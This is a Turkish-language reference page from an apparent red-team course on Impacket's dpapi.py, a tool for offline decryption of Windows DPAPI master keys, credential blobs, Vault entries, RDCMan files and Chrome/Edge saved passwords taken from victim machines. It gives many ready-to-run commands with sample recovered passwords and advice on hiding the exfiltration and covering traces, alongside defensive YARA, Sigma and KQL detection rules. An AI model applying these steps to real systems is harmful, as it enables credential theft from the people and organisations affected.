# dpapi.py

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Impacket çatısı altında yer alan; kurban Windows sistemlerinden diske erişim, gölge kopya (VSS) veya dosya sızdırma yoluyla elde edilen DPAPI MasterKey'lerini, Windows Kasa (Vault) kayıtlarını, Credential blob'larını ve Chrome/Edge tarayıcı verilerini saldırganın kendi Linux/macOS analiz ortamında %100 çevrimdışı (offline) deşifre eden Python kütüphanesi ve komut seti.

---

## 1. Genel Bakış ve Amaç

Sızma testi ve kırmızı takım operasyonlarında hedef makineden dosya sızdırma (Data Exfiltration) veya çevrimdışı adli imaj inceleme aşamalarında sıkça `%APPDATA%\Microsoft\Protect\` dizinindeki MasterKey dosyaları, `%LOCALAPPDATA%\Microsoft\Credentials\` altındaki kasa blob'ları ve Google Chrome / Edge tarayıcılarının `Login Data` SQLite veritabanları ele geçirilir. Bu veriler hedef sistem üzerinde deşifre edilmeye çalışıldığında EDR dedektörleri, süreç izleme logları ve bellek taramaları devreye girer.

**`dpapi.py`** (SecureAuth / Impacket projesi kapsamında Alberto Solino tarafından geliştirilen), **hiçbir Windows makinesine veya API'sine ihtiyaç duymadan**, Windows'un tüm DPAPI kriptografik algoritmalarını (PBKDF2, SHA-1, 3DES, AES-256-CBC, AES-GCM, RSA-2048) saf Python ile yeniden uygulayan çevrimdışı bir analiz motorudur.

Araç iki temel kriptografik adımı yönetir:
1. **MasterKey Çözümleme (`masterkey` modu):** Sızdırılan 512 baytlık ikili MasterKey dosyasını; kullanıcının açık metin parolası, NTLM hash'i veya Domain Controller'dan çekilen DPAPI Domain Backup Key (`.pvk`) ile Linux üzerinde doğrudan çözer ve ham simetrik anahtarı (Cleartext Key) üretir.
2. **Hedef Veri Deşifreleme (`credential`, `vault`, `chrome` modları):** Çözülen MasterKey'i girdi olarak kullanarak Windows Credential Manager'daki RDP şifrelerini, Windows Vault içerisindeki web kimliklerini ve Chromium tabanlı tarayıcıların `Local State` dosyasındaki AES anahtarlarını çözerek kayıtlı tüm şifreleri açık metin olarak döker.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│             HEDEF WINDOWS MAKİNESİ (SIZDIRMA / VSS AŞAMASI)            │
│                                                                        │
│  [ Sızdırılan Ham Dosyalar (Hedefte Kod Çalıştırılmadı) ]             │
│       ├── (1) %APPDATA%\Microsoft\Protect\<SID>\<GUID> (MasterKey)     │
│       ├── (2) %LOCALAPPDATA%\Google\Chrome\User Data\Local State       │
│       ├── (3) %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data│
│       └── (4) %LOCALAPPDATA%\Microsoft\Credentials\<Cred_Blob>         │
└───────────────────────────────────┬────────────────────────────────────┘
                                    │
                                    │ Dosyalar Linux Analiz Makinesine Taşınır
                                    ▼
┌────────────────────────────────────────────────────────────────────────┐
│             SALDIRGAN / ANALİZ MAKİNESİ (LINUX / PYTHON)               │
│                                                                        │
│  [ impacket-dpapi masterkey ]                                          │
│         │                                                              │
│         ├── Girdi: MasterKey Dosyası + SID + (Parola / NTLM / PVK)     │
│         │                                                              │
│         └── Çıktı: [ Ham 512-bit MasterKey: 0x9f8a7b6c5d... ]          │
│                   │                                                    │
│                   ├──> [ impacket-dpapi credential -key 0x9f... ]      │
│                   │      └── Çıktı: RDP / Windows SSO Parolaları       │
│                   │                                                    │
│                   ├──> [ impacket-dpapi chrome -key 0x9f... ]          │
│                   │      └── Çıktı: Web Siteleri, Kullanıcılar, Şifre  │
│                   │                                                    │
│                   └──> [ impacket-dpapi vault -key 0x9f... ]           │
│                          └── Çıktı: Windows Vault Web Kimlikleri       │
└────────────────────────────────────────────────────────────────────────┘
```

### 1.1 DPAPI BLOB İç Yapısı ve Ayrıştırma Algoritması

Windows DPAPI ile şifrelenen her veri bloğu standart bir `DPAPI_BLOB` başlığıyla başlar:
```c
struct DPAPI_BLOB {
    DWORD dwVersion;          // 0x00000001 (Versiyon 1)
    GUID  guidProvider;       // DPAPI Provider GUID
    DWORD dwMasterKeyVersion; // MasterKey Versiyonu
    GUID  guidMasterKey;      // Bu veriyi şifreleyen MasterKey'in GUID'i
    DWORD dwFlags;            // Şifreleme bayrakları
    DWORD dwDescriptionLen;   // Açıklama metni uzunluğu
    WCHAR wszDescription[];   // Açıklama metni
    DWORD dwCryptAlgorithm;   // 0x6603 (3DES) veya 0x6610 (AES-256)
    DWORD dwSaltLen;          // Salt uzunluğu
    BYTE  pbSalt[];           // Rastgele tuz (Salt)
    DWORD dwDataLen;          // Şifreli veri uzunluğu
    BYTE  pbData[];           // Şifreli veri bloğu
    DWORD dwSignLen;          // HMAC İmza uzunluğu
    BYTE  pbSign[];           // HMAC-SHA1 veya SHA-512 imzası
};
```

`dpapi.py`, şifreli dosyayı okuduğunda `guidMasterKey` alanından verinin hangi MasterKey ile şifrelendiğini otomatik olarak saptar. Operatörün tek yapması gereken, ilgili GUID'e sahip MasterKey dosyasını araca sunmaktır.

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Sıfır Uç Nokta İzi (Zero Endpoint Noise)**| Tüm kriptografik işlemler kurban makine dışında, saldırganın Linux makinesinde yapılır. | Uç noktada hiçbir log (Event ID), bellek anomalisi veya EDR uyarısı üretmez. |
| **Windows Bağımsızlığı** | Windows API'lerine (`CryptUnprotectData`) bağımlı değildir; saf Python ile çalışır. | Linux, macOS veya izole analiz laboratuvarlarında sorunsuz çalıştırılabilir. |
| **Toplu Sızdırma Analizi** | Adli imajlardan (E01/RAW) veya VSS kopyalarından çekilen binlerce dosyayı analiz eder. | Büyük çaplı adli bilişim ve kırmızı takım operasyonlarında hızlı otomasyon sağlar. |
| **Domain Backup Key Uyumu** | `impacket-secretsdump` tarafından üretilen `.pvk` ve `.key` dosyalarıyla doğrudan entegredir. | DC kurtarma anahtarıyla tüm kullanıcıların geçmiş parolalarını anında çözer. |

### Karşılaştırma Tablosu

| Kriter | impacket-dpapi (dpapi.py) | SharpDPAPI | Mimikatz (dpapi) | DonPAPI |
|---|---|---|---|---|
| **Platform** | Çapraz Platform (Linux/macOS) | Windows (.NET) | Windows (Yerel C) | Çapraz Platform (Linux) |
| **Çalışma Modu** | Çevrimdışı (Offline Dosya) | Canlı Bellek İçi | Canlı / Çevrimdışı | Uzaktan Ağ (SMB) |
| **Gereken Dosya** | Sızdırılmış `.bin` / DB | Canlı Oturum | Canlı Oturum | Ağ Erişimi (Port 445) |
| **Hedefte İz Bırakma**| **SIFIR (Hedefe dokunmaz)**| Düşük - Orta | Çok Yüksek | Çok Düşük (Sadece SMB) |
| **Komut Satırı Esnekliği**| Alt komut tabanlı CLI | Parametreli CLI | İnteraktif Kabuk | Otomatik Tarayıcı CLI |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Impacket paketinde `impacket-dpapi` veya doğrudan `dpapi.py` olarak çağrılır:

```bash
impacket-dpapi <eylem> [seçenekler]
```

### Desteklenen Eylemler (Actions)

| Eylem | Açıklama |
|---|---|
| `masterkey` | Kullanıcı veya makine MasterKey dosyasını çözer ve ham anahtarı üretir. |
| `credential` | Windows Credential Manager (`CREDENTIAL`) blob dosyasını deşifre eder. |
| `vault` | Windows Vault (`.vcrd` ve `Policy.vpol`) veritabanını çözer. |
| `chrome` | Google Chrome / Edge `Login Data` ve `Local State` dosyalarını deşifre eder. |
| `backupkeys` | Etki alanı kurtarma anahtarlarını (`.pvk` / `.key`) ayrıştırır ve görüntüler. |
| `rdg` | RDCMan Remote Desktop Connection Manager dosyalarını deşifre eder. |

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `-file <dosya>` | Çözümlenecek MasterKey, Credential veya SQLite veritabanı dosyasının yolu. | `-file 7c8d9e0f-...` |
| `-sid <sid>` | MasterKey'in ait olduğu kullanıcının Güvenlik Kimlik Numarası (SID). | `-sid S-1-5-21-255978...-1104` |
| `-password <parola>` | MasterKey türetimi için kullanıcının açık metin parolası. | `-password 'P@ssw0rd2026!'` |
| `-hashes <lm:nt>` | MasterKey türetimi için kullanıcının NTLM hash'i. | `-hashes :01fc5a6be7bc...` |
| `-pvk <dosya>` | Etki alanı kurtarma anahtarı dosyası (Domain Backup Key). | `-pvk domain_backup.pvk` |
| `-key <hex_key>` | Daha önce çözülmüş olan 512-bitlik ham MasterKey değeri (Hex formatında). | `-key 0x9f8a7b6c...` |
| `-state <dosya>` | Chrome/Edge için `Local State` dosyasının dosya yolu. | `-state Local\ State` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: MasterKey Dosyasını Kullanıcı Parolası ve SID ile Çevrimdışı Deşifre Etme

Sızdırılan bir kullanıcının MasterKey dosyası, kullanıcının bilinen parolası ve SID numarası ile Linux üzerinde çözülür:

```bash
impacket-dpapi masterkey -file 7c8d9e0f-1a2b-3c4d-5e6f-7a8b9c0d1e2f -sid S-1-5-21-2559786414-2279769532-2164155192-1104 -password 'Summer2026!'
```

**Konsol Çıktısı Analizi:**

```text
Impacket v0.12.0 - Copyright 2026 Fortra

[*] Target MasterKey: 7c8d9e0f-1a2b-3c4d-5e6f-7a8b9c0d1e2f
[*] Using Password + SID PBKDF2 derivation...
[+] MasterKey successfully decrypted!
[+] Decrypted Key: 0x9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d1673a9f0e1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4
```

---

### Senaryo 2: MasterKey Dosyasını Domain Backup Key (`.pvk`) ile Deşifre Etme

Kullanıcının parolası veya hash'i bilinmediğinde, DC'den elde edilen `.pvk` kurtarma anahtarı ile MasterKey açılır:

```bash
impacket-dpapi masterkey -file 7c8d9e0f-1a2b-3c4d-5e6f-7a8b9c0d1e2f -pvk domain_backupkey.pvk
```

---

### Senaryo 3: Çözülen MasterKey ile Windows Credential Blob'unu Açma

1. Adımda elde edilen 512-bitlik ham anahtar (`-key`) kullanılarak RDP veya Windows SSO şifresini barındıran dosya çözülür:

```bash
impacket-dpapi credential -file 9F8A7B6C5D4E3F2A1B0C9D8E7F6A5B4C -key 0x9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d1673a9f0e1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4
```

**Konsol Çıktısı Analizi:**

```text
[*] Decrypting Credential blob...
[+] Target Name    : TERMSRV/192.168.1.10
[+] User Name      : CORP\Administrator
[+] Decrypted Pass : MasterAdminPass2026!
[+] Last Written   : 14/10/2026 14:22:10 UTC
```

---

### Senaryo 4: Google Chrome `Login Data` ve `Local State` Dosyalarını Çevrimdışı Çözme

Chrome'un şifreli SQLite veritabanı, `Local State` dosyası ve çözülen MasterKey ile Linux üzerinde doğrudan okunur:

```bash
impacket-dpapi chrome -file "Login Data" -state "Local State" -key 0x9a8b7c6d5e4f3a...
```

**Konsol Çıktısı Analizi:**

```text
[*] Parsing Chrome Local State file...
[*] Decrypting Chrome master AES key via DPAPI MasterKey... OK
[*] Reading Chrome Login Data database...
--------------------------------------------------------------------------------
Origin URL: https://portal.azure.com
Username  : dev_admin@corp.local
Password  : AzureCloudP@ss2026!
--------------------------------------------------------------------------------
Origin URL: https://github.com/login
Username  : company_dev
Password  : GitHubPersonalSecretToken!
--------------------------------------------------------------------------------
```

---

### Senaryo 5: Windows Vault (`.vcrd` ve `Policy.vpol`) Kayıtlarını Deşifre Etme

Windows Kasa dizininden çekilen dosyalar çözümlenir:

```bash
impacket-dpapi vault -file 12345678-ABCD-EF01-2345-6789ABCDEF01.vcrd -vpol Policy.vpol -key 0x9a8b7c...
```

---

### Senaryo 6: RDCMan (.rdg) Dosyalarından Toplu RDP Parolası Ayıklama

Sistem yöneticisinin bilgisayarından sızdırılan Remote Desktop Connection Manager dosyasındaki tüm sunucu şifrelerini dökme:

```bash
impacket-dpapi rdg -file connections.rdg -password 'UserPassword123!'
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Exception: Decryption failed (Wrong password or hash)` | Sağlanan parola, NTLM hash veya SID değeri MasterKey'in oluşturulduğu tarihteki kullanıcı bilgileriyle eşleşmiyor. | Parolanın doğruluğunu teyit edin; kullanıcı etki alanında parolasını değiştirdiyse eski parolayı deneyin veya `.pvk` kurtarma anahtarına başvurun. |
| `KeyError: guidMasterKey not found` | Çözülmek istenen Credential veya Chrome dosyası elinizdeki MasterKey ile değil, farklı bir MasterKey GUID'i ile şifrelenmiş. | Dosyanın başlığını `hexdump -C` ile inceleyip `guidMasterKey` alanını okuyun; Protect klasöründen doğru GUID'e sahip dosyayı temin edin. |
| `PVK decryption error / Invalid RSA private key` | Sağlanan `.pvk` dosyası hedef kullanıcının etki alanına ait değil veya dosya bozuk. | `impacket-secretsdump` ile etki alanı denetleyicisinden PVK dosyasını tekrar dışa aktarın. |
| `Chrome v127+ App-Bound Encryption Error` | Google Chrome'un v127 ve üzeri sürümlerinde DPAPI şifrelemesi SYSTEM servis korumasıyla (App-Bound) sarmalanmıştır. | Chrome v127+ için `Local State` tek başına yetmez; hedef makinede SYSTEM seviyesinde çalışan özel anahtar çözücüler gerekir. |
| `UnicodeDecodeError / Malformed SQLite database` | Sızdırılan `Login Data` dosyası Chrome açıkken kopyalandığı için kilitli veya yarım yazılmış. | Kurban makineden dosya çekerken gölge kopya (Volume Shadow Copy / VSS) kullanarak temiz ve kilitlenmemiş imaj alın. |
| `Invalid -key length (Expected 64 or 128 hex chars)` | Komuta geçirilen `-key` değeri 512-bit (64 bayt) uzunluğunda değil veya başında `0x` eksik. | MasterKey dökümündeki ham hex dizgisini eksiksiz kopyalayın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: SIFIR (HEDEF ÜZERİNDE HİÇBİR İŞLEM YAPILMAZ)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : HEDEFTE SIFIR LOG (Tüm işlemler Linux üzerinde)
[ Sysmon ]          : Süreç YOK, Bellek Erişimi YOK, Handle YOK
[ Ağ İmzaları ]     : AĞ TRAFİĞİ YOK (Tamamen çevrimdışı çalışır)
[ Tespit Vektörü ]  : Yalnızca dosyaların hedeften sızdırılması aşaması izlenebilir
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

`dpapi.py` hedef sistem üzerinde çalışmadığı için hedef Windows işletim sisteminde:
- **Hiçbir Windows Security Event ID** (4688, 4672, 4624 vb.) oluşmaz.
- **Hiçbir Sysmon Olayı** (Event ID 1, 7, 10, 11) tetiklenmez.
- **Hiçbir EDR Bellek Taraması** aracı göremez.

*Tek tespit noktası:* Saldırganın bu dosyaları (`Protect`, `Credentials`, `Login Data`) hedef makineden SMB, C2 tüneli veya web üzerinden dışarıya aktardığı (Exfiltration) andır.

### 5.2 Ağ ve EDR İmzaları

- **Sıfır Ağ İmzası:** Araç hiçbir IP'ye bağlanmaz; tamamen yerel dosya sistemindeki baytları ayrıştırır.
- **Analiz Makinesi:** Aracın çalıştığı Linux/macOS makinesinde adli bilişim incelemesi yapılırsa Python yürütme izleri ve üretilen açık metin şifreler bulunur.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1555.003** | Credentials from Web Browsers | Sızdırılan Chrome ve Edge veritabanlarını çevrimdışı çözme. |
| **T1555.004** | Windows Credential Manager | Windows Kasa ve RDP kimliklerini yerel olarak deşifre etme. |
| **T1552.001** | Unsecured Credentials: Credentials in Files | Diskteki şifreli MasterKey ve Credential dosyalarını ayıklama. |
| **T1005** | Data from Local System | Toplanan hassas sistem dosyalarından kimlik üretme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Dosya Sızdırma (Exfiltration) Alarmı** | Hedef makineden dosyaları ham isimleriyle (`Login Data`, `Credentials`) doğrudan indirmeyin. Dosyaları parola korumalı bir 7z/RAR arşivine alarak veya Base64/şifreli C2 kanalı üzerinden dışarı çıkarın. |
| **Açıkta Kalan Çıktı Dosyaları** | Linux analiz makinesinde çözülen parolaları içeren metin dosyalarını RAM disk üzerinde (`/dev/shm`) işleyin; operasyon bitince güvenli bir şekilde silin. |
| **VSS İzi** | Dosyaları canlı makineden çekerken gölge kopya oluşturduysanız (`vssadmin create shadow`), işlem bitince gölge kopyayı mutlaka silin. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma & YARA)

**YARA Kuralı — Sızdırılmış DPAPI MasterKey ve Credential Dosyaları Tespiti:**

```yara
rule Suspicious_DPAPI_Exfiltrated_Artifacts {
    meta:
        description = "Detects exfiltrated DPAPI MasterKey and Credential binary files on disk or network"
        author = "Active Directory Security Project"
        date = "2026-10-14"
        severity = "High"
    strings:
        // DPAPI MasterKey başlık sihirli baytları (Versiyon 1 veya 2)
        $mk_header = { 01 00 00 00 [16] 01 00 00 00 }
        // DPAPI Credential blob GUID sağlayıcısı
        $cred_blob = { 01 00 00 00 D0 8C 9D DF 93 11 D1 8C 7A 00 C0 4F C2 97 EB }
    condition:
        $mk_header at 0 or $cred_blob at 0
}
```

**Sigma Kuralı — Şüpheli DPAPI ve Protect Klasörü Sıkıştırma/Kopyalama Tespiti:**

```yaml
title: Suspicious Staging of DPAPI Protect and Browser Data
status: experimental
description: Detects command line or script activities staging or compressing DPAPI Protect directory and browser data.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    CommandLine|contains|all:
      - 'AppData'
      - 'Protect'
    CommandLine|contains|any:
      - 'tar'
      - '7z'
      - 'zip'
      - 'copy'
      - 'xcopy'
  condition: selection
level: high
```

**Microsoft Sentinel (KQL) — Hassas DPAPI Dizinlerine Yönelik Olağandışı Süreç Erişimi:**

```kql
DeviceFileEvents
| where FolderPath has @"\AppData\Roaming\Microsoft\Protect"
| where ActionType in ("FileRead", "FileCreated")
| where InitiatingProcessFileName !in~ ("lsass.exe", "svchost.exe", "explorer.exe")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FolderPath, FileName
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: MasterKey'i Parola ile Çözme
```bash
impacket-dpapi masterkey -file 7c8d9e0f-... -sid S-1-5-21-...-1104 -password 'Secret123!'
```
- **Ne Yapar?** Sızdırılmış MasterKey dosyasını kullanıcının açık metin parolası ve SID'si ile deşifre eder.
- **Ne Zaman Kullanılır?** Kullanıcının parolası bilindiğinde çevrimdışı ham anahtarı üretmek için.
- **Parametreler:** `-file`: MasterKey dosyası, `-sid`: Kullanıcı SID'si, `-password`: Parola.

### Komut 2: MasterKey'i NTLM Hash ile Çözme
```bash
impacket-dpapi masterkey -file 7c8d9e0f-... -sid S-1-5-21-...-1104 -hashes :01fc5a6be7...
```
- **Ne Yapar?** Açık metin parola olmadan, ele geçirilen NTLM hash ile MasterKey'i açar.
- **Ne Zaman Kullanılır?** DCSync veya bellek dökümünden hash alındığında.
- **Parametreler:** `-hashes`: NTLM hash değeri.

### Komut 3: MasterKey'i Domain Backup Key (PVK) ile Çözme
```bash
impacket-dpapi masterkey -file 7c8d9e0f-... -pvk domain_backup.pvk
```
- **Ne Yapar?** Kullanıcı parolasına ihtiyaç duymadan etki alanı kurtarma anahtarıyla MasterKey'i açar.
- **Ne Zaman Kullanılır?** Kullanıcının şifresi bilinmediğinde veya değiştirildiğinde.
- **Parametreler:** `-pvk`: Domain backup key dosyası.

### Komut 4: Windows Credential Blob'unu Çözme
```bash
impacket-dpapi credential -file 9F8A7B6C... -key 0x9a8b7c6d...
```
- **Ne Yapar?** Çözülen MasterKey'i kullanarak Windows Credential Manager'daki RDP ve SSO şifrelerini basar.
- **Ne Zaman Kullanılır?** Hedefin RDP bağlantı parolalarını öğrenmek için.
- **Parametreler:** `-file`: Credential dosyası, `-key`: Ham 512-bit MasterKey.

### Komut 5: Chrome Parolalarını Çevrimdışı Deşifre Etme
```bash
impacket-dpapi chrome -file "Login Data" -state "Local State" -key 0x9a8b7c6d...
```
- **Ne Yapar?** Google Chrome'un kayıtlı web giriş bilgilerini çözer.
- **Ne Zaman Kullanılır?** Sızdırılan Chrome profilinden web ve bulut şifrelerini almak için.
- **Parametreler:** `-file`: Login Data veritabanı, `-state`: Local State dosyası, `-key`: MasterKey.

### Komut 6: Windows Vault (.vcrd) Dosyasını Çözme
```bash
impacket-dpapi vault -file target.vcrd -vpol Policy.vpol -key 0x9a8b7c6d...
```
- **Ne Yapar?** Windows Vault kayıtlarını ve web kimlik bilgilerini açar.
- **Ne Zaman Kullanılır?** Internet Explorer, Edge veya Windows uygulamalarının kasa şifrelerini incelerken.
- **Parametreler:** `-file`: .vcrd dosyası, `-vpol`: Policy.vpol dosyası.

### Komut 7: RDCMan (.rdg) Dosyalarını Çözme
```bash
impacket-dpapi rdg -file servers.rdg -password 'AdminPassword!'
```
- **Ne Yapar?** RDCMan uzak masaüstü bağlantı yapılandırma dosyasındaki tüm sunucu şifrelerini açar.
- **Ne Zaman Kullanılır?** Sistem yöneticisi profillerinden RDCMan dosyası sızdırıldığında.
- **Parametreler:** `-file`: RDG dosyası, `-password`: Kullanıcı parolası.

### Komut 8: Domain Backup Key Bilgilerini İnceleme
```bash
impacket-dpapi backupkeys -file domain_backup.key
```
- **Ne Yapar?** Önceden çekilmiş DPAPI backup key dosyasının geçerliliğini ve sertifika detaylarını görüntüler.
- **Ne Zaman Kullanılır?** Kurtarma anahtarının hangi etki alanına ait olduğunu doğrulamak için.
- **Parametreler:** `-file`: Backup key ikili dosyası.

### Komut 9: Birden Fazla MasterKey Dosyasını Toplu Çözme (Bash Döngüsü)
```bash
for mk in Protect/S-1-5-21-*/*-*-*-*-*; do impacket-dpapi masterkey -file "$mk" -pvk domain.pvk >> decrypted_keys.txt; done
```
- **Ne Yapar?** Bir dizindeki onlarca MasterKey dosyasını tek komutla PVK kullanarak çözer ve listeler.
- **Ne Zaman Kullanılır?** Büyük bir sunucu imajından sızdırılan tüm profilleri açarken.
- **Parametreler:** Bash for döngüsü ve çıktı yönlendirmesi.

### Komut 10: Çözülen Anahtarları Dosyaya Kaydetme
```bash
impacket-dpapi masterkey -file 7c8d9e0f-... -pvk domain.pvk | grep "Decrypted Key:" | awk '{print $3}' > masterkey.hex
```
- **Ne Yapar?** Çözülen ham MasterKey değerini doğrudan bir hex dosyasına yazar.
- **Ne Zaman Kullanılır?** Sonraki `credential` ve `chrome` komutlarına otomatik girdi sağlamak için.
- **Parametreler:** Standart Linux filtreleme komutları (`grep`, `awk`).

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Fortra / Impacket](https://github.com/fortra/impacket)
- **Impacket DPAPI Örnekleri:** [Impacket DPAPI Scripts & Tools](https://github.com/fortra/impacket/tree/master/examples)
- **MITRE ATT&CK Referansı:** [T1555 - Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)
- **Microsoft DPAPI Teknik İncelemesi:** [DPAPI Architecture & Cryptographic Overview](https://learn.microsoft.com/en-us/previous-versions/ms995355(v=msdn.10))

---

> **Önceki:** [← SharpDPAPI](./SharpDPAPI.md) · **Sonraki:** [SharpChrome →](./SharpChrome.md)
